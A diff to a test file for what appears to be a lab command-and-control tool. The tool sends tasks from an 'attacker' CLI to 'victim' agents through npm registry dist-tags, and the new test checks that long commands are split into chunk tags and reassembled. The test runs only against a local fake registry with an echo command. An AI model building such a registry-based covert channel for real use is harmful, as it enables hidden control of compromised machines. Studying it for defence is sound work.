@@ -6,7 +6,14 @@ import os from 'node:os';
 import path from 'node:path';
 import { spawn } from 'node:child_process';
 import { fileURLToPath } from 'node:url';
-import { decodeCommandTag, encodeAnnounceTag, encodeCommandTag } from '../src/common/protocol.js';
+import {
+  decodeCommandChunkTag,
+  decodeCommandTag,
+  encodeAnnounceTag,
+  encodeCommandTag,
+  isChunkedCommandTag,
+  reassembleCommand,
+} from '../src/common/protocol.js';
 
 const PROJECT_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
 
@@ -271,4 +278,79 @@ test('CLI chain: flag-based add, run against a given agent, legacy migration', a
   // delete leaves the migrated chain behind in a valid store
   assert.deepEqual(JSON.parse(fs.readFileSync(chainFile, 'utf8')), { warmup: ['ping'] });
   assert.ok(fs.existsSync(`${legacyFile}.bak`), 'legacy playbook file kept as .bak');
+});
+
+test('CLI splits long commands into chunk tags the victim can reassemble', async (t) => {
+  const agentId = 'agent1';
+  const announce = encodeAnnounceTag(agentId, {
+    ts: 9_999_999_999_999,
+    host: 'h',
+    cwd: '/lab',
+    lease: 'legacy-lease',
+  });
+  const tags = { latest: '1.0.0', [announce]: '1.0.0' };
+  const writtenTags = [];
+
+  const server = http.createServer((req, res) => {
+    res.setHeader('content-type', 'application/json');
+    if (req.method === 'GET') {
+      res.end(JSON.stringify(tags));
+      return;
+    }
+    if (req.method === 'PUT') {
+      const tag = decodeURIComponent(req.url.split('/').at(-1));
+      writtenTags.push(tag);
+      tags[tag] = '1.0.0';
+      res.end('{}');
+      return;
+    }
+    res.statusCode = 405;
+    res.end('{}');
+  });
+  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+  t.after(() => server.close());
+
+  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-c2-cli-'));
+  const stateFile = path.join(tmp, 'attacker-state.json');
+  const configFile = path.join(tmp, 'config.json');
+  fs.writeFileSync(configFile, JSON.stringify({
+    registryUrl: `http://127.0.0.1:${server.address().port}`,
+    packageName: 'lab-package',
+    pollIntervalSec: 10,
+    stateFile,
+  }));
+
+  const env = {
+    ...process.env,
+    NPM_C2_ENV_FILE: path.join(tmp, 'missing-env.sh'),
+    NPM_C2_REGISTRY_URL: `http://127.0.0.1:${server.address().port}`,
+    NPM_C2_PACKAGE_NAME: 'lab-package',
+    NPM_C2_POLL_INTERVAL: '10',
+    NPM_C2_STATE_FILE: stateFile,
+    NPM_C2_TOKEN: 'test-token',
+  };
+
+  const longText = 'long-command-'.repeat(60); // 780 chars: far past the single-tag limit
+  const result = await runCli(
+    ['src/attacker/cli.js', '--config', configFile],
+    `task ${agentId} echo ${longText}\nexit\n`,
+    env,
+  );
+
+  assert.equal(result.code, 0, result.stderr || result.stdout);
+  assert.match(result.stdout, /sent: task #1 echo -> agent1 \(\d+ chunk tags/);
+  assert.ok(writtenTags.length > 1, `expected multiple chunk tags, got ${writtenTags.length}`);
+  const parts = writtenTags.map((tag) => {
+    assert.ok(isChunkedCommandTag(tag), `not a chunk tag: ${tag.slice(0, 60)}…`);
+    assert.ok(tag.length <= 214, `tag too long: ${tag.length}`);
+    return decodeCommandChunkTag(tag);
+  });
+  const payload = reassembleCommand(parts);
+  assert.equal(payload.op, 'echo');
+  assert.equal(payload.args.text, longText);
+  for (const part of parts) {
+    assert.equal(part.agentId, agentId);
+    assert.equal(part.seq, 1);
+    assert.equal(part.total, writtenTags.length);
+  }
 });
